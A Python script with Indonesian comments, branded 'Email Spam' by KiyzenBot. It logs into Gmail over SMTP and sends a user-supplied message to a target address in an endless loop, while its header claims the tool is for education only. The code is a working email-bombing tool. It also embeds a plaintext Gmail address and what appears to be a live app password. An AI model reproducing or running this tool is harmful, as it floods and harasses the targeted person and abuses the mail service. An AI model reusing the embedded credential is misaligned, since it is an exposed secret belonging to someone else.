# !!! Tools ini hanya untuk tujuan edukasi saja dan tak boleh disalah-gunakan !!!
# !!! Tools ini gratis dan tak boleh dijual-belikan sama sekali !!!
# !!! Tools ini tak boleh diubah kecuali Entitas Cyber karna bisa saja rusak !!!
# !!! Perhatian, Jika Bot terkena limit, ganti Email dan App Password Bot dengan milik sendiri agar tetap bisa berjalan !!!
# !!! App Password: https://myaccount.google.com/apppasswords? !!!
# !!! Pastikan akun Email yang ingin dipakai harus terverifikasi dua langkah !!!
# !!! © 2026 KiyzenBot • Created By 𝙆𝙞𝙨𝙖𝙧𝙖𝙜𝙞 𝙆𝙞𝙮𝙯𝙚𝙣 !!!

import os
import smtplib
from colorama import Fore, Style, init
from email.message import EmailMessage

os.system("clear")
init(autoreset=True)

SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587

# Email dan App Password Bot secara bawaan.
SENDER = "gmail.bot.by.kisaragi.kiyzen@gmail.com"
APP_PASSWORD = "ugws kpvi wayd xqxm"

Banner = """     ______                 _ _    _____
    |  ____|               (_) |  / ____|
    | |__   _ __ ___   __ _ _| | | (___  _ __   __ _ _ __ ___
    |  __| | '_ ` _ \ / _` | | |  \___ \| '_ \ / _` | '_ ` _ \
    | |____| | | | | | (_| | | |  ____) | |_) | (_| | | | | | |
    |______|_| |_| |_|\__,_|_|_| |_____/| .__/ \__,_|_| |_| |_|
    [+] 2026 KiyzenBot                  | |
    [+] Created By Kisaragi Kiyzen      |_|
"""

print(Fore.MAGENTA + Banner)
RECEIVER = input("[+] Example: example@gmail.com\n[+] Target: ")

# Judul dan Pesan yang dikirim.
SUBJECT = input("[+] Subject: ")
BODY = input("[+] Body: ")

msg = EmailMessage()
msg["From"] = SENDER
msg["To"] = RECEIVER
msg["Subject"] = SUBJECT
msg.set_content(BODY)

print("\n[+] System Connecting...")

try:
    with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as smtp:
        smtp.starttls()
        print("[-] System Connected ✓")

        smtp.login(SENDER, APP_PASSWORD)
        print("[-] Login Success ✓ ")

        # Loading...
        os.system("clear")
        print(Fore.MAGENTA + Banner)
        print("[+] Sending E-Mail...")
        print("[+] Wait...")

        while True:
            smtp.send_message(msg)
            print("[+] Spam Target...")

except Exception as e:
    print("[!] Error:", e)
